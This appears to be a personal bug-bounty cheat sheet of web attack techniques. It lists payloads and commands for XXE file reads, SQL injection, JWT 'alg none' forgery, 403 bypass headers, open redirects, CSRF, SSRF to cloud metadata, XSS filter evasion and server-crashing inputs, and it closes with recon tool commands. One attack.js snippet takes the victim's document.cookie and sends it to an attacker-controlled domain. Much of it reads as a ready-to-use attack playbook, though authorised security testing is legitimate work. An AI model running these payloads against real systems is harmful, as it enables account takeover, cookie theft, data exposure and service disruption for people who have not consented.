                  Logic and tokens
0 - validate token after use , email change , password  change , the second token requested 
1-  try to login with two users and see tokens from  inspect -> application and compare them  
2-  you can login and copy token and logout and try to put token back see if you can access   
3-  try to forget password and send code then in the same session add any link to internal profile and see if you can access account data ex: /myaccount (don't reload)  ... you can verfiy if you got session id from >> inspect > applicatoin 
3- try to reset password while more than one device is loged in and reset the password then you can use two sessions in the same time one (which changed the password ) and the other which (is previously loged in and didn't loged out )
3- open firefox and chrome for the same site and login in both change password in chrome and observe firefox still work 
4- try to register as admin then you will get inavalible username >> in the same session go to /myaccount  (don't reload) 
5- if transaction of money from hossam to ali then ?from=hossam&to=ali  can make http polution by &from=ali&from=hossam&to=hossam&to=ali
6- login and go to myacount and change the name or id 
7- if found example.com/?lang=en   in link try to find /?lang=database.yml or any senstive files  
8- try to change the email and observe if there is roleid in response if found change it and put it in the request 
9- try to change the id in url in /myaccount if id unpredictable tr to find post of this person and put id in /myaccount
10- if there is downloadable file try to change the name of request file to download and anaylise it 
11- if need to access /admin and can't then remove it from GET and put X-Original-URL: /admin and if there is any parameters put them in GET /?username=admin put if any direcotry put it in X-Original-URL: /admin/changeusername
12- when trying to make action and non authurized try to change method 
13- try to go to /api and change the method to post then put {} in the body to make response json
14- login to page and reset password put 150 chars and reset if applied then put 2500 chars then server will crash 
15- verify that reset and register and change email links are not valid for ever try send them and change account email or password many times and verfiy that if the first link is valid or not 
16- when found param ?ref= or ssid= in link try to fill it with ?ref=,,,,,,,,,,,,,,,, as you can as it's gonna make system crash 
17- when buying something with coupons  try to put the coupon more than one time or put two coupons alternativily one after one if accepted continue this until finish
18- try to register with registed account before but add "hossam@gmial.com\n" and see if it will register again 
19- try to reset password and use Host header (it's common for developers to use host header in reset password ) and put http://collaborator.com/ and see if there was dns in burpcollaborator oe you can go to your email and sea the link
20- smtp header injection can be found in contact us forms 
21- try to change host header to anything and see the response if ok 200 put localhost or 127.0.0.1 to get unauthrized admin
22- try to put 2 hosts and see if the second host of hacker appear in response if it then make file.js and alert(1)
23- try tp change the host if ok then try to put ip 192.168.0.0 and send to intruder,change last $0$ and try 1-255 see response
24- try to put  GET http://example.com HTTP/1.1 and put host anything see if accepted then use collaborator in host
25- try to sent to paramminer to see if origin: hossamshady.com or null and the injection found in portswigger labs  
26- try to put TRACE instead of GET and see if X-Custom-IP-Authorization header appeared then go to match and replace and leave match field blank and put in replace X-Custom-IP-Authorization: 127.0.0.1 it will give you access for unauthorized places/admin
27- try /.git and if found wget -r the link and analysis it with (git cola tool ) 

google dorks : 
  
  site:target.com inurl:adminintitle:login 
  site:website.comintitle:/admin 
  site:website.cominurl:admin
  intitle:admin intext:admin
  index of / site: /etc/certs + "index of /" */* site:example.com
  
  administrator | debug | login | root | wp-login | master | superuser
  example.com/wp-content/uploads/2021/      >> wordpress 
  example.com/wp-inc/       >> for wp-db files
  
  allintext:username filetype:log     >> find log files 
  ext:sql intext:"-- phpMyAdmin SQL Dump"
  ----------------------------------------------------------------------------
  Debug.log lead to information Disclosure 

Tips : https://target[.]com/wp-content/debug.log

  
  
  ----------------------------------------------------------------------------------------------
  https://app.pluralsight.com/course-player?clipId=fc4ed0ad-2778-4318-8b97-9f2010471064
                      BURPSUITE   
  extentions :: 
        1- co2 >> sqli
        2- retire.js >> jquery and javascript files
        3- carbonator   >> automate targeting , spidering , and scanning vulns
        4- discover content >> in sitemaps and engagment tools > discover content to discover all urls and directories 
        5- jsinder
        6- joseph   >> for analyis token
        7- autosize   >> to check auth bypass
        
        install carbonator in burpsuite pro and run in termainal  ./burpsuite is location of the burp
java -jar -Xmx512M -Djava.awt.headless=true ./burpsuite_pro_v1.8.8.jar http exmple.com 80 / 
        
        
  file upload or download :: file.php%2500.pdf    >> this will ignore .pdf in server but pass filter
  
  go to 
  
  ----------------------------------------------------------------------------------------------
                    JSON EXPLOIT
  
  inject json value of request with xss 
  {"description":"<script>alert(\"hossam\")"}
  try to change the method from get to put to inject database
  
  if json is only in respone take it and modify and then 
  PUT /file.txt           or you can use POST without any parameters in link
  content-type: application/json
  {"description":"<script>alert(\"hossam\");</script>"}

can inject json with sleep >> "username":"hsosamshady;sleep(111)"

                                      JWT
   jwt editor extension for burpsute
   Autorize for burpsuite 
   1- change user role or id in jwt 
   2- change user role and alg to "none" and remove signature and leave . after payload 
   3- 

-------------------------------------------------------------------------------------------
                                    XXE
    
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>    
<stockCheck>
<productId>
&xxe;
</productId><storeId>1</storeId></stockCheck>

can put http://ip_of_the_server/directory and follow directories that appear in response 
can put "http://collaborator_ip" in <!ENTITY xxe SYSTEM "http://collaborator">
 [<!ENTITY % xxe SYSTEM "https://burpcollaborator"> %xxe]     automatically without &xxe
  
  


--------------------------------------------------------------------------------------------
                                       information disclosure
    1- /en-US/splunkd/__raw/services/server/info/server-info?output_mode=json >>https://hackerone.com/reports/1860905
                                          
 -------------------------------------------------------------------------------------------
                                      403 PYPASS
                                      GET /admin HTTP/1.1
Host: web.com                   >>forbidden
---------------------
GET /anyfile  HTTP/1.1
Host: web.com 
X-Original-URL: /admin      ==>200
-------------------
https://web.com/path  ==> forbidden
https://web.com/%2e/path        ==>200
------------------
GET /delete?user=ali    HTTP/1.1    =>unahtorized
-------------------
/admin/panel        ==>403 forbidden
/admin/monitor/     ==>200
then 
/admin/monitor/;panel      ==>200
-----------------
GET /delete?user=ali    HTTP/1.1
X-Custom-IP-Authorization: 127.0.0.1    ==>302 done
------------------
example.com/admin   ==> 403
exmaple.com/admin/.      ==>200
example.com//admin//    ==>200
exmaple.com/./admin/./  ==>200
---------------------
https://example.com/admin   ==>302
https://exmale.com/admin..;
-------------------
when file upload => /?file=file.php   blocked
                   /?file===file.php   passed
                   
                   
Bypass matching on host contain growanz.hubspot.com
    growanz.hubspot.com.mydomain.com
Weak regex by using dot on regex without bypassing it e.g ”^growanz.hubspot.com$|^example.virtual.host$”
    growanzXhubspot.com
Bypass matching on the end at growanz.hubspot.com
    mydomain.com/growanz.hubspot.com
Bypass white list validation
    mydomain.com%23@growanz.hubspot.com
    mydomain.com%25%32%33@growanz.hubspot.com                   
                   

 
 ----------------------------------------------------------------------------------------------
                                open redirect
 https://example.com_https@google.com
 https://victim.com/login/?next=https://your_domain.com
 http://example.com/example.php?url=http://malicious.example.com
 ?next= javascript:$.getScript`https://my_own_domain/attack.js`
 https://victim.com/?next= javascript:$.getScript`https://my_own_domain/attack.js`
 
 attack.js file which will be on my site to extract cookies from user in the other site 
 if(location.host == “my_own_domain”){ 
    Url = new URL(document.location); 
    Parameters = new URLSearchParams(x.search); 
    cookie = Parameters.get(“cookie”); 
    document.write(cookie);
}
else{ 
    var cookie = document.cookie; 
document.location=“https://my_own_domain/attacker.html?cookie="+cookie;}
...................................................................................
apache 2.4.3 has open redirect in server /login >> https://hackerone.com/reports/1782514

http://example.com?redirect_url=javascript://%250Aalert(1)  >> via redirect (rxss)
logout?service=javascript:alert(1)
https://smartreports.mtncameroon.net//hacker.com/..;/css      after // that redirect you to hacker.com
https://www.affirm.com///google.com/?www.affirm.com/?category=interview&page=2    >>redirct it to google 
https://rinkerboats.vanillacommunities.com/home/leaving?Target=http://www.ɡооɡⅼе.ϲоⅿ\:@%20
try to put similar domain as the original like 
- sémrush.com
- sêmrush.com
- sèmrûsh.com
- šemrush.com   >> https://hackerone.com/reports/861940
https://oauth.semrush.com/oauth2/authorize?redirect_uri=https://oauth.šemrush.com/oauth2/success

if failed to redirect to hackersite directly can create personal domain which will automatically redirect hacker to hacker.com
https://victim.com/?url=https://hackersite1.com/?redirecturl=https://hacker.com and make content of hackersite1 to redirect automatically 



 
 ----------------------------------------------------------------------------------------------
            Combining Session Fixation With Http Request Splitting 
            
http://host/loging\r\nSet-Cookie: SESSIONID=12345\r\nDummy-Header:

Respone
HTTP /1.1 302 
Server: host
Locatoin: https://host/login Set-Cookie:SESSIONID=12345 Dummy-Header: /login


            Combining Session fixation with xss 
https://host/search?q=
document.cookie="SESSIONID=12345;%20path=/;
%20domain=.example.com";



----------------------------------------------------------------------------------------------
                                    BRUTE FORCE 
   
   try to login with invalid password 10 times and then go with valid password if your account was not locked the you can do brute force attack 
 
 
 
 
 
 ----------------------------------------------------------------------------------------------

 
1) go get -u http://github.com/lc/gau
2) echo "http://drive.google.com" | gau
3) Read all the secrets



----------------------------------------------------------------------------------------------
  
  Path traversal to LFI 

/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd

echo http://example.gov | waybackurls | grep /images/

# Double Encode Payload: "www.example.com/images/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"   >> in repeater
  
----------------------------------------------------------------------------------------------
nmap -sV -iL host.txt -oN nmap_scan.txt

Wait a few hours

cat nmap_scan.txt | grep open http://pic.example.com


----------------------------------------------------------------------------------------------
                        SQLI 
          
1- AAAA')/**/or/**/(select/**/1)=1%23

login 
2-   ' or 1=1 and email like ('%admin%'); -- 
          any password
3- if there was json {} with email or password request use sqlmap  first put whole request in file.txt ==>
    sqlmap -r request.txt -p email or (password)


----------------------------------------------------------------------------------------------
              SSRF
   /api?id=http://127.0.0.1
  if aws service is on use 169.254.169.254
   




--------------------------------------------------------------------------------------------------
                                    CSRF
   1- if there is no csrftoken try to make poc with burpsuite and put it in server 
   2- if there is token : - try to change request method from post to get and remove csrftoken and see if worked
   3- try to remove the csrftoken and see if the same response
   4- try to make csrftoken in any live account and drop the request to be unused  csrf token and try to use it (one time use)
         - open firefox and try to change email , intercept it and take token and drop the request and then make csrf poc
   5- if you found anything reflected in headers response then you can inject any other header with putting -> in the place         which is reflect  =hossamshady%0D%0ASet-Cookie: csrfKey=hossamshady1011393%3b SameSite=None"
   6- if you found key in cookies csrfkey search for anything reflected in response header and put in the place of autosubmit button of burpsuite csrf poc >> <img src="site.com/?parameterWhichIsRelfectingHeader=hossamshady%0D%0ASet-Cookie: csrfKey=yourCsrfWhichIsNotUsed%3b SameSite=None" onerror="document.forms[0].submit()"> this will submit poc and send csrfkey

  7- if csrftoekn and csrfkey are the same try to put fake csrf for both csrfkey and csrftoken if worked then make above attack with any csrftoken but same
   
   
   
   4- try to make poc by burpsuite and if there is current password try to remove it 
   
  
 
 
 inrul:login;jsessionid=    >> to see squestoinal session id 
 
  
 




--------------------------------------------------------------------------------------------------
            (((XSS))
 - <script>alert(\"hossam\")</script>        // add \ before " to escape filter
- cloudflare bypass 
"-alert(0)-"		X
"-top['al\x65rt'](9)-"	good

- example.com/?uid="-top['al\x65rt'](9)-"
- <iframe src="\\www.google.com"></iframe>
- search for xss polyglot 
- <svg+onload=innerHTML=URL,innerHTML=textContent>#&ltimg/src/onerror=alert(domain)&gt
- svg file upload : CVE-2022-33910: : make >>  Content-Type: image/svg+xml
                       <?xml version="1.0" standalone="no"?>
                      <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

                      <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
                        <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
                        <script type="text/javascript">
                          alert("XSS by BHARAT");
                        </script>
                      </svg>
- if found addEventLister try to inject it with iframe <iframe src="https://site.com/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"> in any other server 
- if there was addEventListener and index of http that enforces the request to be over http 
    <iframe src="https://example.com/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
- if found parseing {} with type load_channel
<iframe src="https://site.com/"onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

- Send the request to Repeater add X-Forwarded-Host: bing.com"><img src/onerror=prompt(document.cookie)> below Host: www.omise.co

upload svg file as picture file.svg
svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 width="2560.000000pt" height="1600.000000pt" viewBox="0 0 2560.000000 1600.000000"
 preserveAspectRatio="xMidYMid meet" onload="alert(document.cookie)">



------------------------------------------------------------
IDOR :: 
  GO to my account and intercept data then change id 
  go to comments and intercept and change the id 
  go to my cart and intercept and change the id 


----------------------------------------------------------------------------------------------

Directory listing::
        try every dir in debuging folders 
              http://example.com/assets
              https://example.com/app
              http://example.com/en

  
  
  ----------------------------------------------------------------------------------------------
  httpx -l hosts.txt -paths /root/login.txt -threads 50 -random-agent -x GET, POST -tech-detect -status-code -follow-redirects -title -content-lengthhttpx -l hosts.txt -ports 80,443,8009,8080,8081,8090,8180,8443 -paths /root/login.txt -threads 50 -random-agent -x GET, POST -tech-detect -status-code -follow-redirects -title -content-length
----------------------------------------------------------------------------------------------




  shodan :: 
      ssl.cert.subject.cn:"website.com" http.title:"admin"
      ssl: "website.com" http.title: "admin"
      ssl.cert.subject.cn:"website.com" admin
      ssl: "website.com" admin
      
      
 Fofa :: 
      cert = "website.com" && title = "admin"
      cert.subject = "website.com" && title = "admin"
      cert = "website.com" && body = "admin"
      
 Censys:: 
       (services.tls.certificates.leaf_data.issuer.common_name: website.com) AND services.http.response.html_title: admin
       (services.tls.certificates.leaf_data.issuer.common_name: website.com) AND services.http.response.body: admin
       
       
       ---------------------------------------------------------------------------------------------------------
       
                                    NMAP
           
           nmap --script http-methods 192.168.1.1         >> to check the allowable methods 
           
       
       
       
       
       
       
       ---------------------------------------------------------------------------------------------------------------
                                              nuclei
nuclei -u "http://example.com" -t nuclei-templates  -tags xss 		>> to use all xss tags  	
nuclei -u "http://example.com" -t nuclei-templates  -author hossam 	>> for templates of hossam
nuclei -u "http://example.com" -t nuclei-templates -severity low,medium
nuclei -u "http://example.com" -t nuclei-templates -p http://127.0.0.1:8080     >> to send the request to burpsuite
nuclei -header "User-Agent:Mozilla(Hacktify_Hacker)"

cat subdmains | nuclei -t nuclei-templates
nuclei -update

rate limit :: requests per second 
bulk-size :: requests parallel
c templates concurrent 
{{BaseURL}}	https://www.example.com:4444/test/example.txt
{{RootURL}}	https://www.example.com:4444
{{Hostname}}	www.example.com:4444
{{Host}}		www.example.com
{{Port}}		4444	
{{Path}}		/test
{{File}}		/example.txt
{{Scheme}}	Https      
       

  
  
  
  ----------------------------------------------------------------------------------------------------------------------
                          TOOLS
  1- http secret and debug finder >> https://github.com/redhuntlabs/httploot                        
  2- httpx 
  3- subfinder 
  4- subbrute
  5- gobuster
  6- dirb
  7- dirsearch
  8- gau
  9- waybackurl 
  10- nuclei
  11- aquatone    >> for checking live and responsive sites 
  12- subjack 
  13- can i takeover xyz
  14- amass     amass enum -ip -src -brute -df domains
  15- masdns 
  16- dnsgen    ==> for providing hidden subdomains     
  17- mksub ==> mksub -d exmaple.com -w wordlist.txt -1 2  >> great 
  18- hunter.how ==> site for searching site ==> via shodan 
  19- subfinder online ==> alternative for subfinder tool 
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
